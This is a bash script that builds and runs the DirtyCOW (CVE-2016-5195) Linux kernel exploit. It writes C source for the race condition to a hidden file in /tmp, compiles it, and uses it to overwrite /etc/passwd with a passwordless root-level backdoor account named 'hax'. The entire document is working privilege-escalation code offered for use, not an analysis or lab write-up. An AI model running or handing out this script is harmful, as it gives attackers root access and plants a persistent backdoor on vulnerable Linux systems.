#!/bin/bash
cd "$(dirname "$0")"
echo "[*] CVE-2016-5195 DirtyCOW"
K=$(uname -r)
echo "[*] Kernel: $K"
cat > /tmp/.cow.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>
void *map;int f;
void *madvise_t(void *arg){for(int i=0;i<100000000;i++)madvise(map,100,MADV_DONTNEED);return NULL;}
void *write_t(void *arg){char *s=(char*)arg;int l=strlen(s);int fd=open("/proc/self/mem",O_RDWR);for(int i=0;i<100000000;i++){lseek(fd,(long)map,SEEK_SET);write(fd,s,l);}return NULL;}
int main(int c,char **v){
if(c<3){printf("Usage: %s file data\n",v[0]);return 1;}
f=open(v[1],O_RDONLY);
struct stat st;fstat(f,&st);
map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
pthread_t t1,t2;
pthread_create(&t1,NULL,madvise_t,NULL);
pthread_create(&t2,NULL,write_t,v[2]);
pthread_join(t1,NULL);pthread_join(t2,NULL);
return 0;
}
EOF
gcc -pthread -o /tmp/.cow /tmp/.cow.c 2>/dev/null
if [ ! -f /tmp/.cow ];then echo "[-] Compile failed";exit 1;fi
echo "[+] Compiled"
echo "[*] This exploit is slow and may take minutes..."
echo "[*] Creating backdoor user..."
cp /etc/passwd /tmp/.p.bak
NEW="hax:x:0:0::/root:/bin/bash"
/tmp/.cow /etc/passwd "$NEW"
echo "[+] Try: su hax"
